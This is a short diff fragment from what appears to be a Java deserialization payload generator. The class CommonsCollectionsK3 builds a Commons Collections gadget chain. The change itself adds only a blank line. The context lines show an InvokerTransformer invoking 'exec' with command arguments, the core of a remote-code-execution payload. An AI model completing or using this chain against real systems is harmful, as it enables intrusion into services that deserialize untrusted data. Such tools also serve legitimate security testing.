@@ -43,6 +43,7 @@ public class CommonsCollectionsK3 extends PayloadRunner implements ObjectPayload
             new InvokerTransformer("exec",
                 new Class[]{String.class}, execArgs),
             new ConstantTransformer(new HashSet<String>())};
+
         ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
 
         HashMap<String, String> innerMap = new HashMap<String, String>();
